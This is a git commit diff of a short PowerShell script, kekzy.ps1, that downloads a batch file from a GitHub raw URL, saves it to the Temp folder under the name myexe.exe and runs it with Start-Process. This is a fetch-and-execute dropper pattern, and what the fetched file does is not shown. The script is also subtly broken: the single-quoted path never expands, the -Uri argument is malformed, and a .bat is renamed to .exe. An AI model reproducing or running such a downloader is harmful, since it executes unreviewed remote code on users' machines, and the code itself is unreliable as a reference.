6de89408a676ce4b69a88b7da024a04d20b9f0b4
deathlimited <denis_srk@live.com>
2017-11-17 03:43:45 +0200

    Update kekzy.ps1

--- kekzy.ps1
+++ kekzy.ps1
@@ -1,5 +1,5 @@
 $url = 'https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat'
 $outpath = '$env:Temp\myexe.exe'
 Invoke-WebRequest -Uri = $url -OutFile $outpath
-$args = @("Comma","Separated","Arguments")
-Start-Process -Filepath "$env:Temp/myexe.exe" -ArgumentList $args
+$args = @('Comma','Separated','Arguments')
+Start-Process -Filepath "$env:Temp\myexe.exe" -ArgumentList $args
